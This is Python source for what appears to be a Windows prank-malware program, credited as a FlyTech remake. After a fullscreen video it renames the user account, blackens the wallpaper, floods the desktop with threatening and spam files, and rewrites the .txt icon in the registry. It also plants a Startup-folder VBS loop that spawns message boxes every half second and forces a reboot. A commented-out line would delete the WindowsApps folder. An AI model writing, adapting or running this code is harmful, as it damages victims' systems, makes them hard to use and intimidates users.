import pygame
from pygamevideo import Video
import time
import os
import getpass
import ctypes
from PIL import Image
import cv2
import shutil
import sys
from PIL import Image, ImageDraw, ImageFont

def resource_path(relative_path):
    if hasattr(sys, '_MEIPASS'):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(base_path, relative_path)

def video():
    pygame.init()

    info = pygame.display.Info()
    screen_w, screen_h = info.current_w, info.current_h
    window = pygame.display.set_mode((screen_w, screen_h), pygame.FULLSCREEN)

    video_path = resource_path("video.mp4")
    cap = cv2.VideoCapture(video_path)

    clock = pygame.time.Clock()
    start_time = time.time()

    while cap.isOpened():
        ret, frame = cap.read()
        if not ret:
            break

        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        frame_surface = pygame.surfarray.make_surface(frame.swapaxes(0, 1))
        frame_surface = pygame.transform.scale(frame_surface, (screen_w, screen_h))
        window.blit(frame_surface, (0, 0))
        pygame.display.flip()

        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                cap.release()
                pygame.quit()
                return
            elif event.type == pygame.KEYDOWN and event.key == pygame.K_ESCAPE:
                cap.release()
                pygame.quit()
                return

        if time.time() - start_time >= 15:
            break

        clock.tick(30)

    cap.release()
    pygame.quit()

def changethings():
    current_username = getpass.getuser() #find current username
    print(current_username)
    os.system(f'wmic useraccount where name="{current_username}" rename "URNEXT"') #change username
    print("successfully change username, 1")

    img = Image.new('RGB', (500, 500), color=0) #save black image
    img.save('C:\\black.png')
    ctypes.windll.user32.SystemParametersInfoW(20, 0 , "C:\\black.png" ,3) #change background black
    print("successfully change background, 2")

    # remove_folder = 'C:\\Program Files\\WindowsApps' #current UWP folder
    # shutil.rmtree(remove_folder) #remove UWP foler
    # print("successfully remove UWP folder, 3") #보류

    openme = "OPENME" * 20
    openmepath = f"C:\\Users\\{current_username}\\Desktop\\{openme}.rtf"
    openmecontents = '''
    YOU ARE THE NEXT
    I CAN SEE YOU

    NOW ITS TOO LATE
    I GOT YOU.......

    YOU HAVE BEEN WARNED




    


    DONT LOOK BEHIND YOU'''
    with open(openmepath, 'w', encoding='utf-8') as f:
        f.write(openmecontents)
    print("successfully write OPENME file, 5")

    for i in range(200): #write 60 URNEXTURNEXT... txt file 
        urnext = "URNEXT" * 10
        file_name = f"{urnext}{i}.txt"
        urnextpath = f"C:\\Users\\{current_username}\\Desktop\\{file_name}"

        with open(urnextpath, 'w', encoding='utf-8') as f:
            urnext = "URNEXT\n" * 30
            f.write(f'{urnext}')
            print("successfully write URNEXT files, 6")

    #making URNEXT ico
    width, height = 64, 64
    bg_color = (255, 0, 0)
    text_color = (0, 0, 0)

    img = Image.new("RGB", (width, height), bg_color)

    draw = ImageDraw.Draw(img)
    text = ("UR\n\n\nNEXT")
    font = ImageFont.load_default()

    bbox = draw.multiline_textbbox((0, 0), text, font=font, align="center")
    text_width = bbox[2] - bbox[0]
    text_height = bbox[3] - bbox[1]
    x = (width - text_width) // 2
    y = (height - text_height) // 2
    draw.multiline_text((x, y), text, fill=text_color, font=font, align="center")

    img.save(f"C:\\Users\\{current_username}\\Documents\\ico.ico")
    print("made ico.ico")
    
    #rnaway.vbs, looprnaway.vbs
    looprnaway_vbs_path = f"C:\\Users\\{current_username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\looprnaway.vbs"
    rnaway_vbs_path = f"C:\\rnaway.vbs"
    with open(rnaway_vbs_path, 'w', encoding='utf-8') as f: #rnaway.vbs
            f.write('msgbox "runaway",vbCritical,"runaway"')
            print('wrote rnaway.vbs')

    with open(looprnaway_vbs_path, 'w', encoding='utf-8') as f: #looprnaway.vbs
            f.write(f'''Set WshShell = CreateObject("WScript.Shell")

    Do
        WshShell.Run "C:\\rnaway.vbs", 1, False
        WScript.Sleep 500
    Loop
    ''')
            print('wrote looprnaway.vbs')

    os.system(f'reg add "HKEY_CLASSES_ROOT\\txtfile\\DefaultIcon" /ve /t REG_SZ /d "C:/Users/{current_username}/Documents/ico.ico" /f') #change txt icon
    os.system('shutdown -r -f -t 0') #reboot


print("Original from FlyTech Remake by ro1004bin")
video()
changethings()